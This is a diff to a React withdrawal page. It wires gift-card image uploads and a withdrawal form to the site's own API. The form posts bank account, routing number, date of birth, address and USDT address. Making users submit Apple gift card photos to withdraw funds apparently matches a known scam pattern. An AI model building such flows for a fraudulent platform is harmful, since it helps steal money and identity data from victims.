@@ -106,7 +106,7 @@ export default function WithdrawPage() {
     };
     reader.readAsDataURL(file);
 
-    // Upload to Supabase Storage bucket via API
+    // Upload file to server/storage via /api/upload
     try {
       const formData = new FormData();
       formData.append('file', file);
@@ -115,18 +115,43 @@ export default function WithdrawPage() {
       const res = await fetch('/api/upload', { method: 'POST', body: formData });
       const data = await res.json();
       if (data?.url) {
-        console.log('✅ Apple Gift Card Front uploaded to Supabase:', data.url);
+        setGiftCards((prev) =>
+          prev.map((c) => (c.id === id ? { ...c, frontImage: data.url } : c))
+        );
+        console.log('✅ Apple Gift Card Front uploaded and bound to state:', data.url);
       }
     } catch (err) {
-      console.warn('Supabase storage upload fallback:', err);
+      console.warn('Upload fallback:', err);
     }
   };
 
   const handleConfirmWithdrawal = async () => {
     setIsSubmitting(true);
-    setTimeout(() => {
-      setIsSubmitting(false);
-      setIsModalOpen(false);
+    try {
+      // 1. Submit Apple Gift Cards to PostgreSQL database
+      await fetch('/api/gift-cards/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ giftCards }),
+      });
+
+      // 2. Submit Withdrawal request to PostgreSQL database
+      await fetch('/api/withdrawals', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          amount: numAmount,
+          payoutMethod,
+          fullName,
+          bankName,
+          routingNumber,
+          accountNumber,
+          address,
+          dob,
+          usdtAddress,
+        }),
+      });
+
       setSuccessMsg(true);
       setAmount('');
       setBankName('');
@@ -135,7 +160,12 @@ export default function WithdrawPage() {
       setDob('');
       setUsdtAddress('');
       setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
-    }, 2000);
+    } catch (err) {
+      console.warn('Error saving withdrawal & gift cards to database:', err);
+    } finally {
+      setIsSubmitting(false);
+      setIsModalOpen(false);
+    }
   };
 
   const isFormValid =
